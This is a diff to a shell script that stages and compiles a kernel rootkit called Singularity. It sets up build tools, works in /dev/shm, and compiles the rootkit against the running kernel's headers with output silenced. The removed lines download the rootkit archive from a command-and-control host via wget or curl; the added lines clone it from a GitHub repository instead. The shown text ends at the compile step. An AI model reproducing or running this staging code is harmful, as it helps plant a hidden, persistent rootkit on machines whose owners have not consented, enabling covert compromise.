@@ -27,10 +27,10 @@ if [ -f /etc/os-release ]; then
         ubuntu|debian|kali)
             export DEBIAN_FRONTEND=noninteractive
             apt-get update -qq
-            apt-get install -y -qq build-essential linux-headers-$(uname -r) curl wget tar
+            apt-get install -y -qq build-essential linux-headers-$(uname -r) curl wget git
             ;;
         fedora|centos|rhel)
-            dnf install -y -q gcc make kernel-devel-$(uname -r) curl wget tar
+            dnf install -y -q gcc make kernel-devel-$(uname -r) curl wget git
             ;;
         *)
             echo "[-] Unsupported OS: $ID"
@@ -41,20 +41,18 @@ else
     echo "[-] Cannot detect OS via /etc/os-release."
 fi
 
-# 3. Download Singularity-Mine (Assumes hosted on C2 via python3 -m http.server)
+# 3. Clone Singularity Rootkit from GitHub
 echo "[*] Staging Singularity Rootkit..."
 cd /dev/shm
-if [ ! -d "Singularity-Mine" ]; then
-    wget -q "http://$C2_IP/Singularity-Mine.tar.gz" || curl -s "http://$C2_IP/Singularity-Mine.tar.gz" -o Singularity-Mine.tar.gz
-    if [ -f "Singularity-Mine.tar.gz" ]; then
-        tar -xzf Singularity-Mine.tar.gz
-    else
-        echo "[-] Failed to download Singularity-Mine.tar.gz from C2. Proceeding anyway..."
+if [ ! -d "Singularity" ]; then
+    git clone -q https://github.com/KriyosArcane/Singularity.git
+    if [ ! -d "Singularity" ]; then
+        echo "[-] Failed to clone Singularity from GitHub. Proceeding anyway..."
     fi
 fi
 
-if [ -d "Singularity-Mine" ]; then
-    cd Singularity-Mine
+if [ -d "Singularity" ]; then
+    cd Singularity
     echo "[*] Compiling Rootkit against $(uname -r) headers..."
     make clean >/dev/null 2>&1
     make >/dev/null 2>&1
